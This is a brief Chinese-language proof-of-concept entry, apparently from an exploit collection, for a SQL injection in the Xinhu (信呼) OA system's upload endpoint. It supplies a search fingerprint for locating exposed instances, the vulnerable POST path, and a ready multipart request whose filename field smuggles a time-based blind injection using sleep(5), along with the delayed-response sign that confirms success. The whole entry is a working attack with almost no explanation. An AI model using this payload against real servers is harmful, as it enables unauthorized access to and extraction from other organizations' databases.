# 信呼OAuploawAction.php存在SQL注入漏洞

信呼 ｜ SQL注入 ｜ —
- **指纹**：`app="信呼-OA系统"`
- **请求**：`POST /index.php?a=upfile&m=uploawapi&d=task HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryitXo7nCpRwksqD9i
Content-Disposition: form-data; name="file"; filename="a',web=(select if(123=123,sleep(5),0))-- .png"
Hello World
------WebKitFormBoundaryitXo7nCpRwksqD9i-
```
- **响应特征**：200 响应时间>=5s